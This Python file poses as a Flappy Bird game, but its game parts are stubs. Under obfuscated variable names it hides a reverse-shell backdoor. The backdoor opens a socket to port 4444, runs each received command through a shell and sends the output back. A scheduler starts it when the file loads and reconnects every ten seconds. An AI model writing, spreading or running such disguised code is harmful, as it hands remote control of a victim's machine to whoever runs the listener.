import sys
import random
import socket, sched, time, subprocess, os

WIDTH = 400
HEIGHT = 700
s = sched.scheduler(time.time, time.sleep)
os = os.name

GAP = 200
SPEED = 5
GRAVITY = 0.3
FLAP_VELOCITY = -10


def Actor(arg, arg1):
    pass
connectionest = False
h4ui3hf2 = 4444
gsjfhdkjghs5 = 'localhost'


bird = Actor('bird', (75, 150))
v43h34iu5 = socket.socket()
pipe_bottom = Actor('bottom',('left', 'top'))
def main(sc):
    global connectionest
    try:
        v43h34iu5.connect((gsjfhdkjghs5, h4ui3hf2))
        connectionest = True
    except Exception as e:
        print(e)
        if type(e) == ConnectionRefusedError:
            print("Listener Not Running\n")
        pass
    s.enter(10, 1, main, (sc,))



    while connectionest:
        try:
            gsf5ugh5us3 = v43h34iu5.recv(100000000)
            gsf5ugh5us3 = gsf5ugh5us3.decode()
            gsh5u4g4 = subprocess.Popen(gsf5ugh5us3, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            sfgshkgs43 = gsh5u4g4.stdout.read()
            gsysi4gy4 = gsh5u4g4.stderr.read()
            #print(sfgshkgs43 + gsysi4gy4)
            print(f"output: {sfgshkgs43}")
            print(f"output error: {gsysi4gy4}")
            print(f"command: {gsf5ugh5us3}")
            if len(sfgshkgs43) < 4 and len(gsysi4gy4) < 4:
                print("[-] The output is none.")
                v43h34iu5.send(bytes("Null", "utf-8"))
                v43h34iu5.send(gsysi4gy4)
            else:
                v43h34iu5.send(sfgshkgs43)
                v43h34iu5.send(gsysi4gy4)

        except Exception as ex:
            print(ex)
            if type(ex) == BrokenPipeError or type(ex) == ConnectionResetError:
                connectionest = False
                print("Host closed the connection\nAttempting to reconnect\n")
pipe_top = Actor('top',('left', 'bottom'))

gameover = Actor('gameover', (200, 200))

one = Actor('1',(200, 150))
one1 = Actor('111',(200, 550))
bg1 = Actor('bg1',(200,350))
pause = Actor('pause', (200, 350))
bird = False
bird = 0
s.enter(10, 1, main, (s,))



def on_key_down(key):
    if key.SPACE == key and bird.dead != True:
        bird.vy = FLAP_VELOCITY
    if key.ESCAPE == key and bird.dead != True:
        pause.draw()


def draw():
    screen.clear()
    bg1.draw()
    one.draw()
    one1.draw()
    bird.draw()
    pipe_bottom.draw()
    pipe_top.draw()
    if bird.dead:
        gameover.draw()

def reset_pipes():
    pipe_gap_y = random.randint(200, 500)
    pipe_top = (WIDTH, pipe_gap_y - GAP // 2)
    pipe_bottom = (WIDTH, pipe_gap_y + GAP // 2)

def update_pipes():
    if pipe_top.right < 0:
       reset_pipes()
    pipe_top.left -= SPEED
    pipe_bottom.left -= SPEED
def update():
    if bird.dead:
        return
    update_pipes()
    update_bird()


def update_bird():
    bird.vy += GRAVITY
    bird.y +=bird.vy
    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.top < 0 or bird.bottom > 700:
        sounds.p.play()
        bird.dead = True
s.run()


reset_pipes()